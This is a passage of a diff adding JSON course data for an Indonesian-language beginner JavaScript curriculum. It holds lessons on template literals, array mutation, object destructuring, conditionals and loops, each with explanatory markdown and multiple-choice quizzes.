+        "contentMd": "# String Manipulation & Template Literals\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara mengolah teks menggunakan **Template Literals (Backticks `` ` ``)** serta method manipulasi string modern (**`includes`**, **`trim`**, **`slice`**, **`toLowerCase`**).\n\n## Mengapa Konsep Ini Penting?\nDi era modern, Anda tidak perlu lagi menyambung string teks secara manual menggunakan tanda tambah (`\"Halo \" + nama + \", umur Anda \" + umur`). Template literals membuat penulisan teks dinamis menjadi sangat bersih dan mudah dibaca.\n\n## 1. Template Literals & Interpolasi Variabel\nGunakan tanda petik terbalik / backtick (`` ` ``) di pojok kiri atas keyboard Anda:\n\n```javascript\nconst nama = \"Acelino\";\nconst peran = \"Frontend Specialist\";\n\n// Interpolasi Variabel yang Elegan:\nconst pesan = `Selamat datang, ${nama}! Anda login sebagai ${peran}.`;\n\n// Mendukung String Multi-Baris Tanpa \\n:\nconst emailTemplate = `\n  Halo ${nama},\n  Terima kasih telah bergabung di BelajarinAja.\n  Selamat belajar!\n`;\n```\n\n## 2. Method Manipulasi String yang Wajib Dikuasai\n\n```javascript\nconst teks = \"  BelajarinAja Platform Web  \";\n\n// 1. Membersihkan Spasi Kosong Tepi (Sanitasi Input Form)\nconst bersih = teks.trim(); // \"BelajarinAja Platform Web\"\n\n// 2. Mengubah Huruf Kecil/Besar (Pencarian Case-Insensitive)\nconsole.log(bersih.toLowerCase()); // \"belajarinaja platform web\"\n\n// 3. Pencarian Substring (Menghasilkan Boolean)\nconsole.log(bersih.includes(\"Platform\")); // true\nconsole.log(bersih.startsWith(\"Belajar\")); // true\n\n// 4. Mengganti Kata (Replace)\nconst baru = bersih.replace(\"Web\", \"Fullstack\"); // \"BelajarinAja Platform Fullstack\"\n\n// 5. Memotong Bagian Teks (Slice)\nconst potongan = bersih.slice(0, 12); // \"BelajarinAja\"\n```\n\n## Kesalahan Umum Pemula\n- **Lupa menyimpan hasil method string**: Karena string bersifat *immutable*, menjalankan `teks.trim()` tidak mengubah isi variabel `teks`. Anda harus menyimpannya ke variabel: `const hasil = teks.trim();`.\n\n## Praktik Mandiri\n1. Buat variabel `const inputUser = \"  admin@belajarinaja.com  \"`.\n2. Bersihkan spasi dan ubah ke huruf kecil menggunakan `inputUser.trim().toLowerCase()`.\n\n## Ringkasan\n- Gunakan **Template Literals (`${}`)** untuk menyisipkan variabel ke dalam teks dan membuat string multi-baris.\n- Gunakan **`includes()`** untuk memeriksa keberadaan kata.\n- Gunakan **`trim()`** untuk membersihkan spasi tak berguna pada input pengguna.\n- Method string selalu menghasilkan **string baru** (tidak mengubah string asli).",
+        "quizzes": [
+          {
+            "id": "q-7-5-1",
+            "question": "Apa keunggulan utama sintaks Template Literals (menggunakan tanda backtick ``) dibandingkan penggabungan string tradisional dengan tanda tambah?",
+            "options": [
+              "Mendukung interpolasi variabel langsung dengan ${...}, mendukung string multi-baris tanpa \\n, dan lebih mudah dibaca.",
+              "Mengubah seluruh teks otomatis menjadi huruf kapital.",
+              "Mengurangi penggunaan kuota internet.",
+              "Mencegah teks dibaca oleh browser."
+            ],
+            "correctIndex": 0,
+            "explanation": "Template literals menyederhanakan penyisipan variabel dan ekspresi logika langsung di dalam string secara deklaratif."
+          },
+          {
+            "id": "q-7-5-2",
+            "question": "Method string manakah yang digunakan untuk memeriksa apakah sebuah kalimat mengandung kata tertentu (menghasilkan boolean true/false)?",
+            "options": [
+              "string.includes('kata')",
+              "string.has('kata')",
+              "string.contains('kata')",
+              "string.searchWord('kata')"
+            ],
+            "correctIndex": 0,
+            "explanation": "string.includes(subString) adalah method standar ECMAScript modern untuk memeriksa keberadaan substring secara boolean."
+          },
+          {
+            "id": "q-7-5-3",
+            "question": "Perhatikan kode berikut:\nconst email = '  User@Domain.Com  ';\nconst hasil = email.trim().toLowerCase();\nApa isi nilai dari variabel hasil?",
+            "options": [
+              "'user@domain.com'",
+              "'  user@domain.com  '",
+              "'USER@DOMAIN.COM'",
+              "undefined"
+            ],
+            "correctIndex": 0,
+            "explanation": "trim() membuang spasi kosong di awal dan akhir, lalu toLowerCase() mengubah seluruh karakter menjadi huruf kecil murni."
+          }
+        ]
+      },
+      {
+        "id": "lesson-7-6",
+        "stageId": "stage-7",
+        "slug": "array-fundamentals-dan-operasi-mutasi",
+        "title": "Array Fundamentals & Operasi Mutasi (push, pop, splice vs slice)",
+        "titleEn": "Array Fundamentals & Mutating Operations",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami struktur array berbasis indeks 0, method mutasi (push, pop, shift, unshift, splice), method non-mutasi (slice, concat), dan Spread Operator [...arr].",
+        "prerequisites": [
+          "string-manipulation-dan-template-literals"
+        ],
+        "learningObjectives": [
+          "Membedakan method array yang memutasi (mengubah array asli) vs method yang mengembalikan array baru (non-mutating).",
+          "Membedakan perbedaan fungsional antara splice() (mutating) dan slice() (non-mutating).",
+          "Menerapkan Spread Operator `[...array]` untuk membuat salinan dangkal (shallow copy) yang aman."
+        ],
+        "whyMatters": "Di React state management, Anda DILARANG memutasi array asli (`arr.push`), melainkan harus selalu menghasilkan array baru menggunakan spread operator `[...arr, item]`.",
+        "careerContext": "Membedakan operasi mutating vs non-mutating adalah kunci keberhasilan mengelola state di React dan Zustand.",
+        "commonMistakes": [
+          "Menggunakan `splice()` di dalam reducer/state React yang menyebabkan state termutasi langsung tanpa memicu re-render.",
+          "Lupa bahwa indeks array dimulai dari angka 0 (elemen pertama adalah `arr[0]`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Array",
+            "definition": "Struktur data koleksi berurutan berbasis indeks numerik yang dimulai dari angka 0."
+          },
+          {
+            "term": "Mutating Method",
+            "definition": "Method yang mengubah data array asli secara langsung (push, pop, shift, splice, sort)."
+          },
+          {
+            "term": "Non-Mutating Method",
+            "definition": "Method yang tidak menyentuh array asli dan mengembalikan salinan array baru (slice, concat, map, filter)."
+          },
+          {
+            "term": "Spread Operator (...)",
+            "definition": "Sintaks untuk membongkar dan menyalin seluruh elemen array ke dalam array baru."
+          }
+        ],
+        "contentMd": "# Array Fundamentals & Operasi Mutasi (push, pop, splice vs slice)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari struktur data **Array**: operasi penambahan/penghapusan elemen, perbedaan kritis antara method **Mutating (Mengubah Asli)** dan **Non-Mutating (Salinan Baru)**, serta teknik penyalinan aman dengan **Spread Operator (`[...]`)**.\n\n## Mengapa Konsep Ini Penting?\nDaftar produk e-commerce, daftar postingan feed, dan keranjang belanja semuanya disimpan dalam bentuk Array. Memahami cara memanipulasi array secara aman tanpa merusak data asli adalah syarat mutlak bagi calon React developer.\n\n## 1. Indeks Array & Operasi Dasar\nArray di JavaScript berbasis indeks nol (**0-indexed**):\n\n```javascript\nconst kursus = [\"HTML\", \"CSS\", \"JavaScript\"];\n\nconsole.log(kursus[0]); // \"HTML\" (Elemen Pertama)\nconsole.log(kursus.length); // 3 (Jumlah Elemen)\nconsole.log(kursus[kursus.length - 1]); // \"JavaScript\" (Elemen Terakhir)\n```\n\n## 2. Mutating Methods (Mengubah Array Asli di Tempat)\nMethod ini langsung mengubah susunan array aslinya:\n- **`push(item)`**: Menambahkan elemen ke akhir array.\n- **`pop()`**: Menghapus dan mengambil elemen terakhir.\n- **`unshift(item)`**: Menambahkan elemen ke awal array.\n- **`shift()`**: Menghapus elemen pertama.\n- **`splice(start, deleteCount, ...items)`**: Menghapus atau menyisipkan elemen di posisi indeks tertentu secara langsung.\n\n```javascript\nconst angka = [1, 2, 3];\nangka.push(4); // angka sekarang menjadi [1, 2, 3, 4]\n```\n\n## 3. Non-Mutating Methods & Perbedaan `splice` vs `slice`\n- **`splice(1, 2)`**: **MEMUTASI** array asli (memotong 2 elemen dari indeks 1).\n- **`slice(1, 3)`**: **TIDAK MEMUTASI** (mengambil salinan potongan dari indeks 1 hingga sebelum indeks 3 dan mengembalikan array baru).\n\n```javascript\nconst original = [\"A\", \"B\", \"C\", \"D\"];\n\n// slice bersifat aman (non-mutating)\nconst potongan = original.slice(1, 3); // [\"B\", \"C\"]\nconsole.log(original); // Tetap [\"A\", \"B\", \"C\", \"D\"] (TIDAK RUSAK)\n```\n\n## 4. Pola Immutability Modern: Spread Operator (`[...]`)\nDi React, untuk menambah atau menyalin array tanpa merusak state lama:\n\n```javascript\nconst listLama = [\"Materi 1\", \"Materi 2\"];\n\n// Menambahkan item baru dengan array baru yang aman:\nconst listBaru = [...listLama, \"Materi 3\"];\n// listBaru = [\"Materi 1\", \"Materi 2\", \"Materi 3\"]\n// listLama tetap aman tidak berubah\n```\n\n## Kesalahan Umum Pemula\n- **Memakai push() di React State**: `items.push(newItem); setItems(items);` tidak akan memicu re-render karena referensi memorinya tidak berubah. Selalu gunakan `setItems([...items, newItem])`.\n\n## Praktik Mandiri\n1. Buat array `const buah = ['Apel', 'Jeruk', 'Mangga']`.\n2. Gunakan `[...buah, 'Pisang']` untuk membuat array baru.\n\n## Ringkasan\n- Array dimulai dari indeks **0**.\n- **Mutating** (`push`, `splice`) mengubah array asli.\n- **Non-mutating** (`slice`, `[...spread]`) mengembalikan array baru yang aman.\n- Selalu prioritaskan pola non-mutating saat mengelola data aplikasi modern.",
+        "quizzes": [
+          {
+            "id": "q-7-6-1",
+            "question": "Manakah kelompok method array berikut yang SEMUANYA bersifat memutasi (mengubah langsung) array aslinya?",
+            "options": [
+              "push(), pop(), shift(), splice()",
+              "map(), filter(), slice(), concat()",
+              "find(), some(), every()",
+              "reduce(), toSorted()"
+            ],
+            "correctIndex": 0,
+            "explanation": "push, pop, shift, dan splice memodifikasi data array di tempat (mutating), sedangkan slice, map, dan filter menghasilkan array baru."
+          },
+          {
+            "id": "q-7-6-2",
+            "question": "Bagaimana cara membuat salinan array baru tanpa mengubah array lama menggunakan Spread Operator modern?",
+            "options": [
+              "const newArr = [...oldArr];",
+              "const newArr = oldArr;",
+              "const newArr = copy(oldArr);",
+              "const newArr = &oldArr;"
+            ],
+            "correctIndex": 0,
+            "explanation": "Sintaks spread [...oldArr] mengekstrak elemen ke dalam array baru dengan referensi memori berbeda, menjaga immutability."
+          },
+          {
+            "id": "q-7-6-3",
+            "question": "Apa perbedaan paling mendasar antara method slice(1, 3) dan splice(1, 3) pada array?",
+            "options": [
+              "slice mengambil potongan elemen dan mengembalikan array baru tanpa mengubah array asli, sedangkan splice menghapus elemen langsung dari array aslinya.",
+              "slice hanya untuk string sedangkan splice hanya untuk angka.",
+              "splice tidak bisa menghapus elemen.",
+              "Keduanya adalah sinonim yang fungsinya persis sama."
+            ],
+            "correctIndex": 0,
+            "explanation": "slice bersifat non-mutating (aman untuk immutability), sedangkan splice bersifat mutating (mengubah array asli di tempat)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-7-7",
+        "stageId": "stage-7",
+        "slug": "object-fundamentals-dan-destructuring",
+        "title": "Object Fundamentals & Destructuring Assignment",
+        "titleEn": "Object Fundamentals & Destructuring",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menyimpan data berpasangan key-value pada Objek, dot notation vs bracket notation, Object Destructuring, dan Optional Chaining (?.).",
+        "prerequisites": [
+          "array-fundamentals-dan-operasi-mutasi"
+        ],
+        "learningObjectives": [
+          "Menyusun data terstruktur menggunakan Objek (Key-Value pairs).",
+          "Mengakses properti menggunakan Dot Notation dan Bracket Notation dinamis `obj[key]`.",
+          "Mengekstrak properti menggunakan Object Destructuring Assignment.",
+          "Mencegah error runtime crash menggunakan operator Optional Chaining (`?.`)."
+        ],
+        "whyMatters": "Semua respon data dari API server dan props komponen di React dikirimkan dalam bentuk Objek.",
+        "careerContext": "Destructuring dan Optional Chaining adalah sintaks yang paling sering Anda tulis setiap hari di frontend development.",
+        "commonMistakes": [
+          "Mencoba membaca properti bersarang pada nilai `null/undefined` (misal: `user.profile.avatar`) tanpa `?.` yang menyebabkan aplikasi crash total (`TypeError: Cannot read properties of undefined`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Object",
+            "definition": "Koleksi data terstruktur yang memetakan pasangan kunci (key/property) dan nilai (value)."
+          },
+          {
+            "term": "Destructuring",
+            "definition": "Sintaks untuk mengekstrak nilai dari objek/array ke dalam variabel individual secara ringkas."
+          },
+          {
+            "term": "Optional Chaining (?.)",
+            "definition": "Operator aman yang menghentikan pembacaan rantai properti jika nilai sebelum tanda tanya adalah null atau undefined."
+          }
+        ],
+        "contentMd": "# Object Fundamentals & Destructuring Assignment\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menyusun entitas data kompleks menggunakan **Objek (Key-Value Pairs)**, teknik ekstraksi cepat dengan **Destructuring Assignment**, serta proteksi error dengan **Optional Chaining (`?.`)**.\n\n## Mengapa Konsep Ini Penting?\nData profil pengguna, spesifikasi produk, dan respon API dari database selalu dimodelkan dalam bentuk Objek. Menguasai sintaks objek membuat manipulasi data menjadi sangat ringkas dan bebas error.\n\n## 1. Dasar Objek & Cara Akses Properti\n\n```javascript\nconst profil = {\n  nama: \"Acelino\",\n  peran: \"Founder & Frontend Specialist\",\n  usia: 24,\n  keahlian: [\"React\", \"TypeScript\", \"Next.js\"]\n};\n\n// 1. Dot Notation (Standar)\nconsole.log(profil.nama); // \"Acelino\"\n\n// 2. Bracket Notation (Wajib jika nama kunci ada di variabel dinamis)\nconst propertiTarget = \"peran\";\nconsole.log(profil[propertiTarget]); // \"Founder & Frontend Specialist\"\n```\n\n## 2. Object Destructuring Assignment (Ekstraksi Cepat)\nDaripada menulis `profil.nama` dan `profil.peran` berulang-ulang, ekstrak langsung menjadi variabel:\n\n```javascript\n// Mengekstrak 'nama' dan 'peran' sekaligus:\nconst { nama, peran } = profil;\n\nconsole.log(nama); // \"Acelino\"\nconsole.log(peran); // \"Founder & Frontend Specialist\"\n\n// Memberi nama alias atau nilai default:\nconst { usia: umurUser, lokasi = \"Indonesia\" } = profil;\n```\n\n## 3. Menghindari Crash dengan Optional Chaining (`?.`)\nJika data profil belum selesai dimuat dari database dan bernilai `null`, mengakses properti bersarang akan melempar error fatal (*crash*):\n\n```javascript\nconst dataAkun = {\n  user: null // Pengguna belum mengisi biodata\n};\n\n// BAHAYA: Melempar Uncaught TypeError dan mematikan seluruh aplikasi web!\n// console.log(dataAkun.user.alamat.kota);\n\n// AMAN: Menggunakan Optional Chaining (?.)\nconsole.log(dataAkun.user?.alamat?.kota); // Mengembalikan undefined dengan aman tanpa crash!\n```\n\n## Kesalahan Umum Pemula\n- **Memakai dot notation untuk variabel dinamis**: Menulis `profil.propertiTarget` akan mencari properti harfiah bernama \"propertiTarget\", bukan nilai string di dalam variabel tersebut. Gunakan `profil[propertiTarget]`.\n\n## Praktik Mandiri\n1. Buat objek `const laptop = { merk: 'ThinkPad', ram: '16GB' }`.\n2. Ekstrak properti `merk` dan `ram` menggunakan Destructuring Assignment.\n\n## Ringkasan\n- Objek menyimpan data dalam format **`{ key: value }`**.\n- Gunakan **Dot Notation (`obj.key`)** untuk akses statis, dan **Bracket Notation (`obj[key]`)** untuk kunci dinamis.\n- **Destructuring (`const { a, b } = obj`)** mengekstrak properti menjadi variabel individual secara ringkas.\n- **Optional Chaining (`?.`)** mencegah aplikasi crash saat membaca data bersarang yang bernilai `null` atau `undefined`.",
+        "quizzes": [
+          {
+            "id": "q-7-7-1",
+            "question": "Perhatikan kode berikut:\nconst user = { name: 'Acelino', role: 'Developer' };\nconst { name, role } = user;\nSintaks apakah yang digunakan pada baris kedua?",
+            "options": [
+              "Object Destructuring Assignment",
+              "Object Constructor Function",
+              "Class Instantiation",
+              "JSON Parsing"
+            ],
+            "correctIndex": 0,
+            "explanation": "Object Destructuring mengekstrak properti objek ke dalam variabel individual terpisah dengan nama yang sesuai secara deklaratif."
+          },
+          {
+            "id": "q-7-7-2",
+            "question": "Bagaimana cara mengakses properti objek yang nama kuncinya tersimpan di dalam variabel dinamis (contoh: const key = 'email')?",
+            "options": [
+              "user[key]",
+              "user.key",
+              "user->key",
+              "user:key"
+            ],
+            "correctIndex": 0,
+            "explanation": "Bracket notation user[key] mengevaluasi nilai string di dalam variabel key, sedangkan user.key secara harfiah mencari properti bernama 'key'."
+          },
+          {
+            "id": "q-7-7-3",
+            "question": "Apa fungsi dari operator Optional Chaining (?.) pada kode user?.profile?.avatar?",
+            "options": [
+              "Mencegah error runtime TypeError jika user atau profile bernilai null/undefined, dengan aman mengembalikan undefined tanpa crash.",
+              "Memaksa objek untuk selalu memiliki properti avatar.",
+              "Menghapus properti avatar dari database.",
+              "Mengubah format avatar menjadi WebP."
+            ],
+            "correctIndex": 0,
+            "explanation": "Optional chaining ?. memeriksa apakah objek sebelum tanda tanya ada; jika null/undefined, evaluasi langsung berhenti dengan aman."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-8",
+    "orderIndex": 8,
+    "titleId": "JavaScript: Logika, Percabangan & Fungsi",
+    "titleEn": "JavaScript: Logic, Control Flow & Functions",
+    "category": "Frontend",
+    "description": "Menguasai struktur kendali percabangan (if, switch, ternary), perulangan (for...of), deklarasi fungsi vs arrow functions, lexical scope, closures, dan Higher-Order Functions (map, filter, reduce).",
+    "descriptionEn": "Master control flow (if, switch, ternary), loops (for...of), arrow functions, lexical scope, closures, and HOFs (map, filter, reduce).",
+    "lessons": [
+      {
+        "id": "lesson-8-1",
+        "stageId": "stage-8",
+        "slug": "percabangan-if-else-switch-dan-ternary",
+        "title": "Percabangan: if-else, switch & Ternary Operator",
+        "titleEn": "Control Flow: if-else, switch & Ternary",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengontrol alur logika program dengan if-else berjenjang, switch-case (fall-through prevention dengan break), dan ternary operator untuk conditional rendering.",
+        "prerequisites": [
+          "object-fundamentals-dan-destructuring"
+        ],
+        "learningObjectives": [
+          "Menyusun logika kondisional menggunakan if, else if, dan else.",
+          "Menerapkan struktur switch-case untuk menangani banyak kondisi diskrit dan mencegah bug fall-through dengan break.",
+          "Menggunakan Ternary Operator (`kondisi ? jika_benar : jika_salah`) untuk ekspresi ringkas di React."
+        ],
+        "whyMatters": "Logika kondisional adalah otak dari setiap keputusan aplikasi (seperti memeriksa apakah user sudah login, role admin, atau kuota habis).",
+        "careerContext": "Ternary operator adalah teknik standar nomor satu untuk conditional rendering di komponen React JSX.",
+        "commonMistakes": [
+          "Lupa menulis kata kunci `break;` pada blok `case` dalam `switch` statement (menyebabkan eksekusi bocor ke case di bawahnya).",
+          "Membuat nested ternary bertingkat 4 lapis yang sangat membingungkan untuk dibaca."
+        ],
+        "keyTerms": [
+          {
+            "term": "Control Flow",
+            "definition": "Urutan eksekusi baris instruksi program yang dikendalikan oleh kondisi logika."
+          },
+          {
+            "term": "Ternary Operator",
+            "definition": "Operator satu baris dengan 3 operan: `condition ? exprIfTrue : exprIfFalse`."
+          },
+          {
+            "term": "Fall-Through",
+            "definition": "Perilaku switch-case di mana eksekusi terus merembes ke case berikutnya jika tidak ada statement `break`."
+          }
+        ],
+        "contentMd": "# Percabangan: if-else, switch & Ternary Operator\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara mengendalikan alur logika program menggunakan **`if-else`**, **`switch-case`**, serta **Ternary Operator (`? :`)** untuk evaluasi satu baris yang elegan.\n\n## Mengapa Konsep Ini Penting?\nAplikasi web harus bisa mengambil keputusan: *\"Jika pengguna belum login, arahkan ke halaman login; jika pengguna adalah admin, tampilkan tombol kelola data\"*. Logika percabangan adalah dasar dari seluruh kecerdasan komputasi.\n\n## 1. Struktur Standar: `if-else`\nGunakan `if-else` untuk evaluasi kondisi umum dan rentang nilai:\n\n```javascript\nconst nilai = 85;\n\nif (nilai >= 90) {\n  console.log(\"Grade: A\");\n} else if (nilai >= 80) {\n  console.log(\"Grade: B\");\n} else {\n  console.log(\"Grade: C\");\n}\n```\n\n## 2. Pilihan Diskrit Bersih: `switch-case`\nGunakan `switch-case` saat Anda mencocokkan **satu variabel terhadap banyak kemungkinan nilai pasti** (seperti status transaksi atau tipe aksi):\n\n```javascript\nconst statusPesanan = \"DIKIRIM\";\n\nswitch (statusPesanan) {\n  case \"PENDING\":\n    console.log(\"Menunggu pembayaran...\");\n    break; // WAJIB: Hentikan eksekusi di sini\n  case \"DIPROSES\":\n    console.log(\"Pesanan sedang dikemas.\");\n    break;\n  case \"DIKIRIM\":\n    console.log(\"Pesanan dalam perjalanan kurir.\");\n    break;\n  default:\n    console.log(\"Status pesanan tidak dikenali.\");\n}\n```\n\n> **Peringatan Fall-Through**: Jika Anda lupa menulis `break;`, program akan terus menjalankan case di bawahnya secara beruntun meskipun kondisinya tidak cocok!\n\n## 3. Evaluasi Satu Baris: Ternary Operator (`? :`)\nTernary operator adalah ekspresi yang mengembalikan nilai secara langsung, menjadikannya standar emas untuk conditional rendering di React:\n\n```javascript\n// Format: kondisi ? jika_benar : jika_salah\nconst isLoggedIn = true;\nconst salam = isLoggedIn ? \"Selamat Datang Kembali!\" : \"Silakan Login Terlebih Dahulu\";\n\nconsole.log(salam);\n```\n\n## Kesalahan Umum Pemula\n- **Membuat Nested Ternary yang Ruwet**: Menulis `a ? b ? c : d : e ? f : g` yang sangat sulit dibaca manusia. Jika kondisi terlalu kompleks, gunakan blok `if-else` atau fungsi terpisah.\n\n## Praktik Mandiri\n1. Buat variabel `const role = \"ADMIN\"`.\n2. Gunakan ternary operator untuk menentukan apakah variabel `canDelete` bernilai true jika role adalah \"ADMIN\", atau false jika bukan.\n\n## Ringkasan\n- Gunakan **`if-else`** untuk kondisi logika dinamis dan rentang nilai.\n- Gunakan **`switch-case`** untuk mencocokkan nilai diskrit enum dan selalu sertakan **`break;`**.\n- Gunakan **Ternary Operator (`kondisi ? benar : salah`)** untuk ekspresi kondisional ringkas satu baris.",
+        "quizzes": [
+          {
+            "id": "q-8-1-1",
+            "question": "Sintaks Ternary Operator manakah yang benar untuk menggantikan blok if-else sederhana?",
+            "options": [
+              "condition ? exprIfTrue : exprIfFalse",
+              "condition : exprIfTrue ? exprIfFalse",
+              "if (condition) ? true : false",
+              "condition -> exprIfTrue | exprIfFalse"
+            ],
+            "correctIndex": 0,
+            "explanation": "Ternary operator memiliki struktur evaluasi: kondisi ? hasil_jika_benar : hasil_jika_salah."
+          },
+          {
+            "id": "q-8-1-2",
+            "question": "Kapan Anda sebaiknya menggunakan struktur switch-case dibandingkan rantai if-else if yang panjang?",
+            "options": [
+              "Ketika mencocokkan satu variabel diskrit terhadap banyak kemungkinan nilai pasti yang spesifik (seperti status aksi).",
+              "Hanya saat membandingkan rentang angka lebih besar atau lebih kecil.",
+              "Saat membutuhkan looping perulangan array.",
+              "Ketika tidak memiliki kondisi default."
+            ],
+            "correctIndex": 0,
+            "explanation": "switch-case lebih bersih dan terorganisir secara visual saat mengevaluasi nilai diskrit diskrit atau enum action."
+          },
+          {
+            "id": "q-8-1-3",
+            "question": "Apa yang terjadi jika Anda lupa menuliskan kata kunci break; di akhir sebuah blok case dalam switch statement?",
+            "options": [
+              "Terjadi fenomena Fall-Through: eksekusi akan terus merembes menjalankan blok case berikutnya di bawahnya meskipun kondisinya tidak cocok.",
+              "JavaScript akan melempar SyntaxError langsung.",
+              "Browser akan menutup tab secara otomatis.",
+              "Nilai variabel akan menjadi null."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tanpa break;, alur eksekusi akan merembes ke case berikutnya (fall-through) hingga menemukan break atau akhir blok switch."
+          }
+        ]
+      },
+      {
+        "id": "lesson-8-2",
+        "stageId": "stage-8",
+        "slug": "perulangan-for-while-dan-for-of",
+        "title": "Perulangan: for, while, for...of & for...in",
+        "titleEn": "Loops: for, while, for...of & for...in",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengulang instruksi dengan for loop, while, iterasi array modern dengan for...of, iterasi kunci objek dengan for...in, break, dan continue.",
+        "prerequisites": [
+          "percabangan-if-else-switch-dan-ternary"
+        ],
+        "learningObjectives": [
+          "Membedakan peruntukan for...of (iterasi nilai array/iterable) vs for...in (iterasi kunci objek).",
+          "Mengontrol alur perulangan dengan statement break (berhenti total) dan continue (lewati satu putaran).",
+          "Mencegah bug fatal Infinite Loop pada loop while yang memblokir Main Thread browser."
+        ],
+        "whyMatters": "Memproses daftar ribuan data secara otomatis memerlukan pemahaman perulangan yang efisien dan aman.",
+        "careerContext": "`for...of` adalah perulangan standar modern untuk data iterable sebelum beralih ke Higher-Order Array methods.",
+        "commonMistakes": [
+          "Menggunakan `for...in` untuk array (for...in mengiterasi string indeks dan properti prototipe yang lambat dan rawan bug urutan).",
+          "Lupa memperbarui variabel kondisi pada loop `while`, menyebabkan tab browser hang/freeze total."
+        ],
+        "keyTerms": [
+          {
+            "term": "Loop",
+            "definition": "Struktur kontrol untuk mengeksekusi blok kode yang sama secara berulang selama kondisi terpenuhi."
+          },
+          {
+            "term": "for...of",
+            "definition": "Perulangan modern untuk mengiterasi nilai (values) dari objek yang dapat diiterasi (Array, Map, Set)."
+          },
+          {
+            "term": "for...in",
+            "definition": "Perulangan untuk mengiterasi nama kunci properti (keys) dari sebuah Objek."
+          },
+          {
+            "term": "break vs continue",
+            "definition": "break menghentikan perulangan seketika; continue melompati sisa iterasi saat ini dan maju ke iterasi berikutnya."
+          }
+        ],
+        "contentMd": "# Perulangan: for, while, for...of & for...in\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara melakukan iterasi data menggunakan **`for`**, **`while`**, loop modern **`for...of`** (untuk Array), **`for...in`** (untuk Objek), serta mengontrol alur dengan **`break`** dan **`continue`**.\n\n## Mengapa Konsep Ini Penting?\nJika Anda memiliki daftar 1.000 produk dari database, Anda tidak mungkin menulis kode penampil produk 1.000 kali. Perulangan mengotomatiskan pemrosesan data dalam sekejap.\n\n## 1. Iterasi Array Modern: `for...of`\nIni adalah cara paling bersih dan mudah dibaca untuk mengiterasi nilai-nilai elemen array:\n\n```javascript\nconst materi = [\"HTML5\", \"CSS3\", \"JavaScript\", \"React\"];\n\n// for...of membaca NILAI (value) secara langsung:\nfor (const item of materi) {\n  console.log(`Materi: ${item}`);\n}\n```\n\n## 2. Iterasi Kunci Objek: `for...in`\nGunakan `for...in` HANYA untuk membaca kunci properti (*keys*) pada sebuah Objek:\n\n```javascript\nconst user = { nama: \"Acelino\", peran: \"Developer\", kota: \"Jakarta\" };\n\nfor (const kunci in user) {\n  console.log(`${kunci}: ${user[kunci]}`);\n}\n```\n\n> **Aturan Wajib**: Jangan gunakan `for...in` untuk array! Gunakan `for...of` untuk array, dan `for...in` untuk objek.\n\n## 3. Mengontrol Alur: `break` vs `continue`\n- **`break`**: Menghentikan perulangan dan langsung **keluar dari seluruh loop**.\n- **`continue`**: Melompati sisa kode pada putaran saat ini dan **langsung maju ke putaran berikutnya**.\n\n```javascript\nconst angkaList = [1, 2, 3, 4, 5, 6];\n\nfor (const n of angkaList) {\n  if (n === 3) continue; // Lewati angka 3\n  if (n === 5) break;    // Berhenti total saat mencapai 5\n  console.log(n);        // Mencetak: 1, 2, 4\n}\n```\n\n## 4. Bahaya Infinite Loop pada `while`\nLoop `while` akan terus berjalan selama kondisinya benar. Jika Anda lupa memperbarui variabel penghitung:\n\n```javascript\n// BAHAYA INFINITE LOOP: MEMBUAT BROWSER FREEZE / CRASH!\nlet hitungan = 0;\nwhile (hitungan < 5) {\n  console.log(hitungan);\n  // Lupa menulis: hitungan++;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memblokir Main Thread**: Menjalankan perulangan komputasi berat tanpa batas di JavaScript yang bersifat Single-Threaded akan membekukan antarmuka browser sehingga tombol tidak bisa diklik.\n\n## Praktik Mandiri\n1. Buat array angka `[10, 20, 30, 40, 50]`.\n2. Gunakan `for...of` untuk menjumlahkan seluruh angka tersebut ke dalam variabel `total`.\n\n## Ringkasan\n- Gunakan **`for...of`** untuk mengiterasi nilai elemen Array.\n- Gunakan **`for...in`** untuk mengiterasi kunci properti Objek.\n- **`break`** memutus perulangan, sedangkan **`continue`** melompati satu putaran.\n- Pastikan loop memiliki kondisi berhenti yang pasti untuk mencegah **Infinite Loop** yang merusak browser.",
+        "quizzes": [
+          {
+            "id": "q-8-2-1",
+            "question": "Manakah jenis perulangan modern yang paling tepat digunakan untuk mengiterasi nilai-nilai elemen di dalam sebuah Array?",
+            "options": [
+              "for (const item of array) { ... }",
+              "for (const key in array) { ... }",
+              "loop (array) { ... }",
+              "repeat (item in array) { ... }"
+            ],
+            "correctIndex": 0,
+            "explanation": "for...of mengiterasi nilai (value) dari objek iterable seperti Array secara bersih dan modern."
+          },
+          {
+            "id": "q-8-2-2",
+            "question": "Apa perbedaan fungsi antara statement break dan continue di dalam sebuah perulangan?",
+            "options": [
+              "break menghentikan dan keluar dari seluruh perulangan seketika, sedangkan continue melompati sisa baris pada putaran saat ini dan langsung maju ke putaran berikutnya.",
+              "continue keluar dari loop dan break mengulang dari awal.",
+              "break hanya untuk fungsi rekursif.",
+              "Keduanya memiliki fungsi yang persis sama."
+            ],
+            "correctIndex": 0,
+            "explanation": "break memutus paksa loop secara permanen, sementara continue hanya melewati sisa instruksi pada satu putaran iterasi saat ini."
+          },
+          {
+            "id": "q-8-2-3",
+            "question": "Mengapa loop while tanpa kondisi terminasi (peningkatan variabel/break) yang jelas merupakan bug kritis dalam aplikasi web?",
+            "options": [
+              "Akan menyebabkan Infinite Loop yang memblokir Main Thread JavaScript, membuat halaman web freeze (hang total) dan browser tidak merespon.",
+              "Akan mematikan server database cloud.",
+              "Akan mengubah browser menjadi dark mode otomatis.",
+              "Akan menghapus file JavaScript lokal."
+            ],
+            "correctIndex": 0,
